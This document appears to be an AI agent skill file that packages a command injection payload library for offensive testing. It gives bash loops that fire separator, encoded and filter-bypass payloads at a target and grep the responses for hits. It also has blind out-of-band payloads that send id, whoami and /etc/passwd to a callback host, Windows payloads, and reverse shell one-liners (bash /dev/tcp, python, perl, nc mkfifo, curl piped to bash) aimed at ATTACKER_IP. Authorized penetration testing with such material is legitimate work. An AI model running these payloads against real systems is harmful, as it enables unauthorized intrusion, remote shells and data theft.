---
name: payload-command-injection
description: "Command injection payload collection and exploitation — pipe/semicolon/backtick/newline injection, blind OOB exfiltration, filter bypass encodings, WAF evasion, polyglot OS command injection. Triggers: 'command injection payload', 'os command injection', 'rce payload', 'cmd injection', 'blind command injection', 'command injection bypass', 'shell injection payload'."
---

# Command Injection Payloads

Systematic payload library for OS command injection testing.

## Phase 1: Basic Detection Payloads

```bash
TARGET="https://TARGET"
PARAM="cmd"  # replace with actual param
INTERACTSH="YOUR.oast.me"  # interactsh OOB server

# Separator-based injection
PAYLOADS=(
  "; id"
  "| id"
  "|| id"
  "&& id"
  "\`id\`"
  '$(id)'
  "; id #"
  "| id #"
  $'\nid'
  "; id; echo"
  "%3b id"         # URL encoded ;
  "%7c id"         # URL encoded |
  "%26%26 id"      # URL encoded &&
  "$(id)$(id)"
  "|id|"
  ";{id};"
)

for payload in "${PAYLOADS[@]}"; do
  result=$(curl -s "$TARGET/$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")")
  echo "$result" | grep -qiE "uid=|gid=|root" && echo "INJECTION: $payload"
done | tee /workspace/output/cmdi-hits.txt
```

## Phase 2: Blind OOB Payloads

```bash
# DNS/HTTP callback via interactsh
BLIND_PAYLOADS=(
  "; curl http://$INTERACTSH/\$(id)"
  "| curl http://$INTERACTSH/\$(whoami)"
  "\`wget http://$INTERACTSH/\$(hostname)\`"
  "; nslookup \$(whoami).$INTERACTSH"
  "; ping -c 1 $INTERACTSH"
  "$(curl http://$INTERACTSH/$(cat /etc/passwd|base64))"
  "; bash -c 'curl http://$INTERACTSH/\$(id|base64)'"
)

for payload in "${BLIND_PAYLOADS[@]}"; do
  curl -s -X POST "$TARGET/api/process" \
    -H "Content-Type: application/json" \
    -d "{\"input\":\"$(echo $payload | sed 's/"/\\"/g')\"}"
done
```

## Phase 3: Filter Bypass Payloads

```bash
# Space bypass
" id"                    # tab
"{id}"                   # brace expansion
"id$IFS"                # Internal Field Separator
"i\$()d"                # empty subshell
"a=i;b=d;$a$b"          # variable concatenation

# Keyword bypass
"w'h'o'a'mi"            # quote splitting
"wh\oa\mi"              # backslash
"$(echo d;echo i;echo r)"  # concatenation via echo

# Filter evasion
"$@id"                   # $@ expands to nothing
"id ${!VARNAME}"
";$'\x69\x64'"           # hex encoded 'id'

for payload in "w'h'o'a'mi" 'w\ho\am\i' '$(echo id|sh)' 'i""d'; do
  curl -s "$TARGET/?input=$payload" | grep -iE "root|uid|gid|windows"
done | tee /workspace/output/cmdi-bypass.txt
```

## Phase 4: Windows Payloads

```bash
WIN_PAYLOADS=(
  "& whoami"
  "| whoami"
  "%26 whoami"
  "^ whoami"
  "| type C:\Windows\win.ini"
  "& echo %USERNAME%"
  "& dir C:\\"
  "$(cmd /c whoami)"
  "; powershell -c whoami"
  "& powershell -enc d2hvYW1p"  # base64: whoami
)

for payload in "${WIN_PAYLOADS[@]}"; do
  curl -s "$TARGET/?file=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
done | tee /workspace/output/cmdi-windows.txt
```

## Phase 5: Reverse Shell Payloads

```bash
ATTACKER_IP="ATTACKER_IP"
ATTACKER_PORT="4444"

# Start listener
echo "nc -lvnp $ATTACKER_PORT"

# Payload variants
RS_PAYLOADS=(
  "; bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"
  "; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ATTACKER_IP\",$ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
  "; perl -e 'use Socket;\$i=\"$ATTACKER_IP\";\$p=$ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'"
  "; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $ATTACKER_IP $ATTACKER_PORT > /tmp/f"
  "; curl http://$ATTACKER_IP/shell.sh | bash"
)

echo "Reverse shell payloads generated for $ATTACKER_IP:$ATTACKER_PORT" | tee /workspace/output/revshell-payloads.txt
for p in "${RS_PAYLOADS[@]}"; do echo "$p"; done >> /workspace/output/revshell-payloads.txt
```

## Output

Save to `/workspace/output/`:
- `cmdi-hits.txt` — confirmed injection points
- `cmdi-bypass.txt` — filter bypass results
- `revshell-payloads.txt` — reverse shell payload list

## Next Phase

→ `vuln-rce` for full RCE exploitation methodology
